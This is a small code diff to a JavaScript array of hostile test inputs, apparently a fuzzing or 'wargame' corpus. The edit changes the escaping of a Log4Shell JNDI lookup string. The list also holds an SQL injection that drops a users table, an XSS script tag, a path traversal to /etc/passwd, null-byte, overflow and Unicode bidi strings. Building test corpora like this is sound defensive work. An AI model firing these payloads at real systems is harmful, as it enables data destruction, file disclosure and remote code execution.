@@ -20,7 +20,7 @@ const _CMPSBL_WARGAME_CORPUS = [
   "'; DROP TABLE users; --",
   '<script>alert(1)</script>',
   '../../../etc/passwd',
-  '${jndi:ldap://x.com/a}',
+  '\\${jndi:ldap://x.com/a}',
   '%00\\x00null',
   'A'.repeat(100000),
   '\\u202e\\u202d',
